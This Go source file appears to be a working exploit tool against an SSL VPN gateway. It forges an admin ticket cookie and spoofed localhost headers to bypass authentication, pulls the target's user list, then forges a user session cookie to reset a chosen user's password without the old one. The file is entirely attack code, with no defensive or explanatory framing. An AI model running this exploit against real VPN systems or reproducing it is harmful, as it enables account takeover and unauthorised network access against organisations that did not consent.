package module

import (
	"crypto/tls"
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"github.com/go-resty/resty/v2"
	"log"
	"net/http"
	"strings"
	"time"
)

func (v *vpnConnect) getUserList() {
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
		"X-Forwarded-For": "127.0.0.1",
		"X-Originating":   "127.0.0.1",
		"X-Remote-IP":     "127.0.0.1",
		"X-Remote-Addr":   "127.0.0.1"}
	headers["cookie"] = "gw_admin_ticket=1"
	v.users = make([]string, 0)
	client := resty.New()
	client.SetHeaders(headers)
	client.SetBaseURL(v.target)
	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client.SetTimeout(time.Duration(v.timeout) * time.Second)
	resp, err := client.R().Get(getUserListPath)
	if err != nil {
		log.SetPrefix("[-] ")
		log.Fatalln(err)
	}
	dom, err := goquery.NewDocumentFromReader(strings.NewReader(string(resp.Body())))
	if err != nil {
		log.SetPrefix("[-] ")
		log.Fatalln(err)
	}
	if !strings.Contains(string(resp.Body()), "用户信息") {
		log.SetPrefix("[-] ")
		log.Fatalln("target may secure.")
	}
	log.SetPrefix("[*] ")
	log.Println("Try To Get Target's User List.")
	dom.Find("#user_unsel > option").Each(
		func(i int, selection *goquery.Selection) {
			v.users = append(v.users, strings.Split(selection.Text(), "->")[1])
		})
	log.SetPrefix("[*] ")
	log.Println("Target User List Got It.")
	log.Printf("Target Have %d User.\n", len(v.users))
	v.canGetUser = true
	v.cookie = resp.Cookies()[0].Value
}
func (v *vpnConnect) changePassword() {
	v.showUserList()
	var index int
	fmt.Print("[!] Give A Num of User That You Want To Change Password:")
	fmt.Scanf("%d\n", &index)
	log.SetPrefix("[*] ")
	log.Printf("Trying To Change User %s's Password.", v.users[index])
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
		"Content-Type":    "application/x-www-form-urlencoded",
		"X-Forwarded-For": "127.0.0.1",
		"X-Originating":   "127.0.0.1",
		"X-Remote-IP":     "127.0.0.1",
		"X-Remote-Addr":   "127.0.0.1",
	}
	headers["cookie"] = fmt.Sprintf(`PHPSESSID=%s;gw_user_ticket=ffffffffffffffffffffffffffffffff; user_lang_id=2; last_step_param={"this_name": "%s","subAuthId": "1"}`, v.cookie, v.users[index])
	client := resty.New()
	client.SetHeaders(headers)
	client.SetBaseURL(v.target)
	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client.SetTimeout(time.Duration(v.timeout) * time.Second)
	body := fmt.Sprintf(`password=%s&repassword=%s&vcode=&old_pass=`, password, password)
	resp, err := client.R().SetBody(body).Post(changePasswordPath)
	if err != nil {
		log.SetPrefix("[-] ")
		log.Fatalln(err)
	}
	if resp.StatusCode() == http.StatusOK && strings.Contains(string(resp.Body()), "修改密码成功") {
		log.SetPrefix("[!] ")
		log.Printf("User %s's Password Change To %s", v.users[index], password)
	} else {
		log.SetPrefix("[!] ")
		dom, err := goquery.NewDocumentFromReader(strings.NewReader(string(resp.Body())))
		if err != nil {
			log.SetPrefix("[-] ")
			log.Fatalln(err)
		}
		log.SetPrefix("[!] ")
		log.Fatalln(dom.Find(".main_font").Text())
	}
}
func (v *vpnConnect) Run() {
	v.init()
	v.getUserList()
	if v.change {
		v.changePassword()
	}
}
